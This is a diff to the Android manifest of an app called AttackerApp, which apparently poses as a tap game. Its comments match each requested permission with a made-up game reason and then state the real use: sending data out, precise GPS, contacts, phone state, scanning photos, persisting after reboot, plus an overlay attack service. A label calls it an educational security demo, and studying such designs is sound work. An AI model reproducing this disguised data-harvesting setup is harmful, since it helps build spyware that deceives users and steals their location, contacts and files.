@@ -2,22 +2,54 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- Overlay permission: allows drawing on top of other apps -->
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <!-- ═══════════════════════════════════════════════════════════════
+         PERMISSIONS — Disguised as normal game requirements.
+         Each permission has a plausible game-related justification.
+         In reality, all are used for maximum intelligence gathering.
+         ═══════════════════════════════════════════════════════════════ -->
 
-    <!-- Usage stats: allows detecting which app is in the foreground -->
+    <!-- "Leaderboards & multiplayer" → actually: exfiltrate data -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <!-- "Find nearby players" → actually: get WiFi SSID, BSSID, IP -->
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- "Local co-op mode" → actually: precise GPS location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- "Share scores with friends" → actually: read contacts list -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- "Vibration feedback" → actually: legit, but normalizes permission list -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+
+    <!-- "Game sounds when calls come in" → actually: read phone state, carrier -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- "Save replays & screenshots" → actually: scan photos/files -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+
+    <!-- "Boot auto-start for daily rewards" → actually: persist after reboot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- "Camera avatar" → actually: camera access (not used yet, but granted) -->
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <!-- ═══ Original overlay attack permissions ═══ -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission
         android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
-
-    <!-- Required for foreground service on API 26+ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-
-    <!-- API 34 requires specific foreground service type declaration -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
-
-    <!-- Required for notification channel on API 33+ -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Location foreground service type for "nearby players" -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
 
     <application
         android:name=".AttackerApp"
@@ -27,7 +59,6 @@
         android:supportsRtl="true"
         android:theme="@android:style/Theme.Material.NoActionBar">
 
-        <!-- Main launcher activity (tap game disguise) -->
         <activity
             android:name=".ui.launcher.LauncherActivity"
             android:exported="true">
@@ -37,17 +68,24 @@
             </intent-filter>
         </activity>
 
-        <!-- Session viewer -->
         <activity android:name=".ui.sessions.SessionListActivity" />
 
-        <!-- Overlay foreground service -->
         <service
             android:name=".service.OverlayService"
             android:exported="false"
-            android:foregroundServiceType="specialUse">
+            android:foregroundServiceType="specialUse|location">
             <property
                 android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                 android:value="educational_security_demo_overlay" />
         </service>
+
+        <!-- Auto-start on boot for "daily rewards" -->
+        <receiver
+            android:name=".service.BootReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
     </application>
 </manifest>
